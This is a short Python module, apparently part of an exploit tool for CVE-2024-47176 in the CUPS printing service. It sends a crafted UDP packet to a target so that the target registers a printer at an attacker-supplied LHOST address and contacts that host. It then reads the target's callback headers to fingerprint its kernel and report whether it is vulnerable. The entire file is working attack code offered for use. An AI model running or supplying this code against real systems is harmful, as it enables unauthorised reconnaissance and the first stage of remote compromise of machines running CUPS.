# The 2xdropout 2024

import socket

def snagKernal(data):
    headers = data.split('\n')
    print(f"\033[93m[CVE_2024_47176]\033[37m Finding Kernal Information")
    for header in headers:
        if "User-Agent" in header:
            print(f'\033[93m[CVE_2024_47176]\033[37m Target Machine Kernal & Architecture:  {header.replace('User-Agent: ','')}')
            

def verify(data, printerName):
    headers = data.split('\n')
    print(f"\033[93m[CVE_2024_47176]\033[37m Evaluating Header:  {headers[0]}")
    for header in headers:
        if "User-Agent" in header:
            print(f'\033[93m[CVE_2024_47176]\033[37m Target Machine Kernal & Architecture:  {header.replace('User-Agent: ','')}')

    if(printerName in headers[0]):
        print(f"\033[93m[CVE_2024_47176]\033[37m SYSTEM VULNERABLE!")
        return True
    else:
        print(f"\033[93m[CVE_2024_47176]\033[37m SYSTEM DOES NOT SEEM TO BE VULNERABLE")        
        return False


def initiate(RHOST, RPORT, LHOST, SVRPORT, printerName):

    payload = f"0 3 http://{LHOST}:{SVRPORT}/printers/{printerName}"
    print(f"\033[93m[CVE_2024_47176]\033[37m Prepping Payload:  '{payload}'")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    recipient_address = (RHOST, int(RPORT))

    message = payload
    data = message.encode('utf-8')

    sock.sendto(data, recipient_address)
    print("\033[93m[CVE_2024_47176]\033[37m Payload Sent")
    print("\033[93m[CVE_2024_47176]\033[37m Response Can Take A While. Go Get Some coffee")
    sock.close()
